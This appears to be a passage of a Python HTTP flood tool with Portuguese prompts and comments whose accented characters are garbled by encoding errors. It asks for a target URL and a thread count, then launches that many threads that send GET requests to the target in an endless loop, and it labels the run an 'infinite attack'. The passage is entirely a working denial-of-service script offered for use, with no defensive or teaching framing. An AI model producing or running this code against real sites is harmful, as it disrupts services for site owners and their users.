# FunÃ§Ã£o que envia requisiÃ§Ãµes sem parar
def flood(url):
    while True:
        try:
            r = requests.get(url, headers=HEADERS, timeout=5)
            if r.status_code == 200:
                print(Fore.GREEN + "[200 OK] Site respondeu normalmente.")
            else:
                print(Fore.YELLOW + f"[{r.status_code}] Resposta recebida.")
        except:
            print(Fore.RED + "[ERR] Site falhou ou bloqueou.")

# Main
def main():
    banner()
    url = input(Fore.CYAN + "ğŸ”— Digite a URL do alvo (ex: http://exemplo.com): ").strip()
    try:
        threads = int(input(Fore.MAGENTA + "ğŸ’¥ Quantas threads simultÃ¢neas (ex: 100)? "))
    except:
        print("Entrada invÃ¡lida.")
        return

    print(Fore.MAGENTA + "\nğŸ”¥ Iniciando ataque infinito... pressione CTRL+C para parar.\n")

    for _ in range(threads):
        t = threading.Thread(target=flood, args=(url,))
        t.daemon = True
        t.start()

    try:
        while True:
            pass  # mantÃ©m o script rodando
    except KeyboardInterrupt:
        print(Style.RESET_ALL + "\n\nâŒ Ataque interrompido pelo usuÃ¡rio.")

if __name__ == "__main__":
    main()
